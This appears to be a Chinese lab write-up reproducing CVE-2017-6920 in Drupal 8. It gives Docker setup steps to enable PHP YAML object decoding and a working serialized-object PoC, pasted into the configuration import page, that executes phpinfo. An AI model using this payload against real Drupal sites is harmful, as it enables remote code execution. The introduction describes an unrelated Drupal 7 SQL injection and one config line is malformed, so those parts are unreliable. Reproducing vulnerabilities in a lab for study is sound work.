# Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包改包--->信息被爆出

### 0x01漏洞介绍

​			Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。

##### 影响版本

```
Drupal < 8.3.4
```

### 0x02漏洞复现

​				**先安装 `yaml` 扩展**

```
！！！需要先进入容器 docker exec -it [id] /bin/bash
# 换镜像源，默认带vim编辑器，所以用cat换源，可以换成自己喜欢的源
cat > sources.list << EOF
deb http://mirrors.163.com/debian/ jessie main non-free contrib
deb http://mirrors.163.com/debian/ jessie-updates main non-free contrib
deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib
deb-src http://mirrors.163.com/debian/ jessie main non-free contrib
deb-src http://mirrors.163.com/debian/ jessie-updates main non-free contrib
deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib
deb http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib
deb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib
EOF
# 安装依赖
apt update
apt-get -y install gcc make autoconf libc-dev pkg-config
apt-get -y install libyaml-dev
# 安装yaml扩展
pecl install yaml
docker-php-ext-enable yaml.so
# 启用 yaml.decode_php 否则无法复现成功
echo 'yaml.decode_php = 1 = 1'>>/usr/local/etc/php/conf.d/docker-php-ext-yaml.ini
# 退出容器
exit
# 重启容器，CONTAINER换成自己的容器ID
docker restart CONTAINER
```

​			**环境启动后，访问 `http://your-ip:8080/` 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。**

![Drupal_PECL_YAML_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Drupal_PECL_YAML_RCE_1.jpg)

![Drupal_PECL_YAML_RCE_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Drupal_PECL_YAML_RCE_2.jpg)			

​		**登录一个管理员账号**

​		**访问 `http://127.0.0.1:8080/admin/config/development/configuration/single/import`**

​		**如下图所示，`Configuration type` 选择 `Simple configuration`，`Configuration name` 任意填写，`Paste your configuration here` 中填写PoC如下**

```
!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"
```

​				**点击 `Import` 后可以看到漏洞触发成功，弹出 `phpinfo` 页面**

​			![Drupal_PECL_YAML_RCE_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Drupal_PECL_YAML_RCE_3.jpg)

​			![Drupal_PECL_YAML_RCE_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Drupal_PECL_YAML_RCE_4.png)

### 0x03参考资料

https://paper.seebug.org/334/





